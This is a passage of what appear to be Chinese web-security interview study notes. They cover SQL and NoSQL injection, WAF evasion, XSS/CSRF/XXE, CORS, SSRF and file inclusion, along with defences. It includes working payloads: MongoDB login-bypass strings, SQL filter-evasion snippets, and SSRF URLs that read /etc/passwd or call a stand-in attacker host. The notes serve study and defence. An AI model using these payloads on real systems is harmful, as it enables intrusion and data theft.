<li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 <a target="_blank" rel="noopener" href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></li>
<li>open_basedir: 将用户可操作的文件限制在某目录下</li>
</ul>
</li>
</ol>
<h4 id><a href="#" class="headerlink" title></a></h4><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><ol>
<li>基于报错注入</li>
<li>基于布尔的注入，根据返回页面判断条件真假的注入</li>
<li>基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>宽字节注入</li>
<li>联合查询，可以使用 union 的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<h3 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。</p>
<h3 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wjy397/article/details/53263281">https://blog.csdn.net/wjy397/article/details/53263281</a></p>
</blockquote>
<ol>
<li>确定waf类型，狗、盾、神、锁、宝、卫士</li>
<li>使用注释符号或者特殊符号或者多个特殊符号重复</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">--</span><br><span class="line">-- - //5.6.12特性，需要加空格</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/ //c风格注释</span><br><span class="line">/**//**/  //多个注释</span><br><span class="line">/*letmetest*/</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 科学记数法</span><br><span class="line">id=0e1union select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 空白字符</span><br><span class="line">SQLite3 0A 0D 0C 09 20 </span><br><span class="line">MySQL5 09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL 0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用sql内置函数或者关键字</li>
</ol>
<blockquote>
<p>报错注入 <a target="_blank" rel="noopener" href="https://blog.csdn.net/like98k/article/details/79646512">https://blog.csdn.net/like98k/article/details/79646512</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 常用</span><br><span class="line">extractvalue</span><br><span class="line">updatexml 报错注入</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">or updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; select * from  users where id = 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&#x27;users&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">floor()</span><br><span class="line">ceil()</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">concat(version(),&#x27;|&#x27;,user());</span><br><span class="line">concat_ws(&#x27;|&#x27;,1,2,3)</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#x27;a&#x27;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br></pre></td></tr></table></figure>


<ol start="4">
<li>利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入</li>
<li>畸形协议&#x2F;请求。asp&#x2F;asp.net在解析请求的时候，允许application&#x2F;x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get&#x2F;post外随便定义协议也可能过</li>
<li>%0a换行</li>
<li>多次URL编码，waf的一根筋过滤</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>http参数污染，<code>id=1&amp;id=2&amp;id=3</code> <code>id=1,2,3</code></li>
</ol>
<h3 id="如何进行SQL注入的防御"><a href="#如何进行SQL注入的防御" class="headerlink" title="如何进行SQL注入的防御"></a>如何进行SQL注入的防御</h3><ol>
<li><p>关闭应用的错误提示 </p>
</li>
<li><p>加waf</p>
</li>
<li><p>对输入进行过滤</p>
</li>
<li><p>限制输入长度</p>
</li>
<li><p>限制好数据库权限，drop&#x2F;create&#x2F;truncate等权限谨慎grant</p>
</li>
<li><p>预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。</p>
</li>
<li><p>数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5</p>
</li>
<li><p>清晰的编程规范，结对&#x2F;自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。</p>
</li>
<li><p>具体的语言如何进行防注入，采用什么安全框架</p>
</li>
</ol>
<blockquote>
<p>作者：没啥意思<br>链接：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/22953267/answer/23222069">https://www.zhihu.com/question/22953267/answer/23222069</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<blockquote>
<p>SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。</p>
</blockquote>
<blockquote>
<p>我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。</p>
</blockquote>
<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>mysql的网站注入，5.0以上和5.0以下有什么区别？</h3><p>10年前就出了5.0，现在都到5.7了，没啥意义的问题</p>
<ul>
<li>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</li>
<li>5.0以下是多用户单操作，5.0以上是多用户多操做。</li>
</ul>
<h3 id="SQL和NoSQL的区别"><a href="#SQL和NoSQL的区别" class="headerlink" title="SQL和NoSQL的区别"></a>SQL和NoSQL的区别</h3><p>SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库</p>
<h4 id="SQL优点"><a href="#SQL优点" class="headerlink" title="SQL优点"></a>SQL优点</h4><p>关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。</p>
<ol>
<li>结构稳定，不易修改，常用联表查询</li>
<li>查询能力高，可以操作很复杂的查询</li>
<li>一致性高，处理数据会使用封锁保证数据不被改变</li>
<li>表具有逻辑性，易于理解</li>
</ol>
<h4 id="SQL缺点"><a href="#SQL缺点" class="headerlink" title="SQL缺点"></a>SQL缺点</h4><ol>
<li>不适用高并发读写</li>
<li>不适用海量数据高效读写</li>
<li>层次多，扩展性低</li>
<li>维护一致性开销大</li>
<li>涉及联表查询，复杂，慢</li>
</ol>
<h4 id="NoSQL优点"><a href="#NoSQL优点" class="headerlink" title="NoSQL优点"></a>NoSQL优点</h4><p>采用键值对存储数据</p>
<ol>
<li>由于数据之间没有关系，所以易扩展，也易于查询</li>
<li>数据结构灵活，每个数据都可以有不同的结构</li>
<li>由于降低了一致性的要求，所以查询速度更快</li>
</ol>
<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p>非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。</p>
<p>两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。</p>
<h4 id="MongoDB注入方式"><a href="#MongoDB注入方式" class="headerlink" title="MongoDB注入方式"></a>MongoDB注入方式</h4><p>利用正则：找到y开头的name   <code>db.items.find(&#123;name: &#123;$regex: &quot;^y&quot;&#125;&#125;)</code></p>
<p>一些payload</p>
<ol>
<li><code>?login[$regex]=^&amp;password[$regex]=^</code></li>
<li><code>?login[$not][$type]=1&amp;password[$not][$type]=1</code></li>
</ol>
<h2 id="XSS-CSRF-XXE"><a href="#XSS-CSRF-XXE" class="headerlink" title="XSS CSRF XXE"></a>XSS CSRF XXE</h2><h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><blockquote>
<p>xss学习 <a target="_blank" rel="noopener" href="https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+">https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+</a></p>
</blockquote>
<p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 </p>
<p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p>
<p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<h3 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h3><ul>
<li>CSRF是跨站请求伪造攻击，由客户端发起 </li>
<li>SSRF是服务器端请求伪造，由服务器发起 </li>
<li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li>
</ul>
<h3 id="啥是同源策略，跨域有几种方式？"><a href="#啥是同源策略，跨域有几种方式？" class="headerlink" title="啥是同源策略，跨域有几种方式？"></a>啥是同源策略，跨域有几种方式？</h3><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p>
</blockquote>
<p>浏览器安全的基石是”同源政策”，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制：<br>    - Cookie、LocalStorage 和 IndexDB 无法读取。<br>    - DOM 无法获得。<br>    - AJAX 请求不能发送</p>
<h3 id="如何规避同源策略？"><a href="#如何规避同源策略？" class="headerlink" title="如何规避同源策略？"></a>如何规避同源策略？</h3><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>向服务器请求json数据回调，一般请求URL会加上<code>&amp;callback=xx</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。</p>
<h5 id="JSONP的劫持"><a href="#JSONP的劫持" class="headerlink" title="JSONP的劫持"></a>JSONP的劫持</h5><blockquote>
<p><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2015/03/jsonp_security_technic/">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
</blockquote>
<p>防御：</p>
<ol>
<li>验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行</li>
<li>随机token</li>
<li></li>
</ol>
<h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4><p>WebSocket是一种通信协议，使用ws:&#x2F;&#x2F;（非加密）和wss:&#x2F;&#x2F;（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
<h4 id="CORS-重点"><a href="#CORS-重点" class="headerlink" title="CORS(重点)"></a>CORS(重点)</h4><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2016/04/cors.html">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
</blockquote>
<p>CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。<br>CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</p>
<h5 id="与JSONP的比较"><a href="#与JSONP的比较" class="headerlink" title="与JSONP的比较"></a>与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h3 id="DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？"><a href="#DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？" class="headerlink" title="DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？"></a>DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/26628342">https://www.zhihu.com/question/26628342</a></p>
</blockquote>
<p>存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；</p>
<p>反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；</p>
<p>DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；</p>
<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/21979782">https://www.zhihu.com/question/21979782</a><br>浏览器内容安全策略，减少xss攻击。</p>
</blockquote>
<h3 id="SSRF漏洞原理是什么？利用时有哪些伪协议？"><a href="#SSRF漏洞原理是什么？利用时有哪些伪协议？" class="headerlink" title="SSRF漏洞原理是什么？利用时有哪些伪协议？"></a>SSRF漏洞原理是什么？利用时有哪些伪协议？</h3><blockquote>
<p>secpulse.com&#x2F;archives&#x2F;65832.html</p>
</blockquote>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p>
<h4 id="ssrf用处"><a href="#ssrf用处" class="headerlink" title="ssrf用处"></a>ssrf用处</h4><ol>
<li>探测内网信息,用协议探<code>ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;</code></li>
<li>攻击内网或本地其他服务</li>
<li>穿透防火墙</li>
</ol>
<h4 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处"></a>漏洞处</h4><ol>
<li>能够对外发起网络请求的地方</li>
<li>请求远程服务器资源的地方</li>
<li>数据库内置功能</li>
<li>邮件系统</li>
<li>文件处理</li>
<li>在线处理工具</li>
</ol>
<p>举几个例子：</p>
<ol>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找ImageMagick，xml这些。</li>
<li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li>
</ol>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ol>
<li><code>http://example.com@127.0.0.1</code></li>
<li>利用IP地址的省略写法绕过,[::]绕过localhost</li>
<li>DNS解析 <a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/">http://127.0.0.1.xip.io/</a>  可以指向任意ip的域名：xip.io</li>
<li>利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过</li>
</ol>
<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/70471.html">https://www.secpulse.com/archives/70471.html</a></p>
</blockquote>
<p>接受ua为curl的时候，支持的协议有<br><img data-src="F:\blog\source_posts\技术面试\15235056451.png"></p>
<p>使用<code>curl -v http://xx.com/ssrf.php?url=sxxx</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">ssrf.php?url=file:///etc/password</span><br><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>
</blockquote>
<ol>
<li><p>检查是否为内网IP地址<br>绕过方法:<br> 利用八进制IP地址绕过<br> 利用十六进制IP地址绕过<br> 利用十进制的IP地址绕过<br> 利用IP地址的省略写法绕过<br>最好的做法：IP地址转换为整数再进行判断</p>
</li>
<li><p>获取真正请求的host</p>
<ol>
<li><p>如何正确的获取用户输入的URL的Host？<br>最常见的就是，使用<a target="_blank" rel="noopener" href="http://233.233.233.233@10.0.0.1:8080/%E3%80%81http://10.0.0.1#233.233.233.233%E8%BF%99%E6%A0%B7%E7%9A%84URL%EF%BC%8C%E8%AE%A9%E5%90%8E%E7%AB%AF%E8%AE%A4%E4%B8%BA%E5%85%B6Host%E6%98%AF233.233.233.233%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8D%B4%E6%98%AF10.0.0.1%E3%80%82%E8%BF%99%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E7%9A%84%E6%98%AF%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AF%B9URL%E8%A7%A3%E6%9E%90%E7%9A%84%E9%94%99%E8%AF%AF%EF%BC%8C%E6%9C%89%E5%BE%88%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%94%9A%E8%87%B3%E4%BC%9A%E7%94%A8%E6%AD%A3%E5%88%99%E5%8E%BB%E8%A7%A3%E6%9E%90URL%E3%80%82%E4%BD%BF%E7%94%A8urllib.parse%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E7%9C%9F%E6%AD%A3%E7%9A%84hostname">http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname</a></p>
</li>
<li><p>只要Host只要不是内网IP即可吗？<br>host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查</p>
</li>
<li><p>只要Host指向的IP不是内网IP即可吗？<br>不一定，可能会30x跳转</p>
</li>
</ol>
</li>
</ol>
<p>归纳<br>解析目标URL，获取其Host<br>解析Host，获取Host指向的IP地址<br>检查IP地址是否为内网IP<br>请求URL<br>如果有跳转，拿出跳转URL，执行1</p>
<h3 id="在浏览器端，Referer可以篡改吗？"><a href="#在浏览器端，Referer可以篡改吗？" class="headerlink" title="在浏览器端，Referer可以篡改吗？"></a>在浏览器端，Referer可以篡改吗？</h3><p>通过插件修改，一般抓包修改</p>
<h3 id="xss盲打到内网服务器的利用"><a href="#xss盲打到内网服务器的利用" class="headerlink" title="xss盲打到内网服务器的利用"></a>xss盲打到内网服务器的利用</h3><h3 id="xss代码层防御"><a href="#xss代码层防御" class="headerlink" title="xss代码层防御"></a>xss代码层防御</h3><h2 id="文件上传下载遍历漏洞"><a href="#文件上传下载遍历漏洞" class="headerlink" title="文件上传下载遍历漏洞"></a>文件上传下载遍历漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
<li>容器漏洞，解析漏洞</li>
</ol>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fuckcat_2333/article/details/52132559">https://blog.csdn.net/fuckcat_2333/article/details/52132559</a></p>
</blockquote>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol>
<li>本地文件包含</li>
<li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。</li>
</ol>
<h3 id="PHP文件包含函数"><a href="#PHP文件包含函数" class="headerlink" title="PHP文件包含函数"></a>PHP文件包含函数</h3><ol>
<li><p><code>include()</code> ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
</li>
<li><p><code> inclue_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
</li>
<li><p><code>require()</code>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p>
</li>
<li><p><code> require_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
</li>
</ol>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol>
<li>读取敏感文件</li>
<li>远程包含shell</li>
<li>图片上传并包含图片shenll</li>
<li>使用伪协议</li>
<li>包含日志文件GetShell</li>
<li>截断包含</li>
</ol>
<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
<li>过滤<code>../</code>等特殊符号</li>
<li>修改Apache日志文件的存放地址</li>
<li>开启魔术引号 <code>magic_quotes_qpc=on</code></li>
<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
</ol>
<h2 id="web框架漏洞弱点"><a href="#web框架漏洞弱点" class="headerlink" title="web框架漏洞弱点"></a>web框架漏洞弱点</h2><h3 id="服务端注入之Flask框架中服务端模板注入问题"><a href="#服务端注入之Flask框架中服务端模板注入问题" class="headerlink" title="服务端注入之Flask框架中服务端模板注入问题"></a>服务端注入之Flask框架中服务端模板注入问题</h3><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/135953.html">http://www.freebuf.com/articles/web/135953.html</a></p>
</blockquote>
<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="TCP三次握手四次挥手"><a href="#TCP三次握手四次挥手" class="headerlink" title="TCP三次握手四次挥手"></a>TCP三次握手四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><ol>
<li>客户端 syn 发送到服务端，变成 SYN_SENT 状态</li>
<li>服务端 ack&#x3D;syn+1 回传syn到客户端，变成SYN_RECV状态</li>
<li>客户端 ack&#x3D;syn+1， 变成ESTABLISHED状态，传输给服务端</li>
<li>服务端收到ACK后变成ESTABLISHED状态，建立连接</li>
</ol>
<p>SYN标志位为表示请求连接，ACK表示确认</p>
<h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>客户端&#x3D;主动关闭方</p>
<ol>
<li>客户端FIN-&gt;服务端</li>
<li>服务端ACK&#x3D;FIN+1-&gt;客户端，服务端到客户端的连接关闭</li>
<li>服务端FIN-&gt;客户端</li>
<li>客户端ACK&#x3D;FIN+1-&gt;服务端</li>
</ol>
